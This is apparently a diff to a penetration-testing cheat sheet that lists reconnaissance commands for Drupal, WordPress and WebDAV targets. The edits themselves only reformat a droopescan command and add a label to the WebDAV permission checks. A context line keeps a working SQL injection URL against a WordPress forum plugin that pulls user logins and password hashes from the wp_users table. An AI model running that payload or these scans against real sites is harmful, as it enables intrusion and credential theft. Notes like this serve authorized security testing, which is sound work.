@@ -37,7 +37,7 @@ Authentication
         Google default credentials for app
 
 Drupal
-    *$droopescan scan -u $ip*
+    *$ droopescan scan -u $ip*
 
 Wordpress
     Scan for known bugs:
@@ -46,6 +46,7 @@ Wordpress
     */wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23*
 
 Webdav
+    Test incorrect permissions:
     *$ cadaver http://$ip*
     *$ davtest http://$ip*
 Bruteforcing
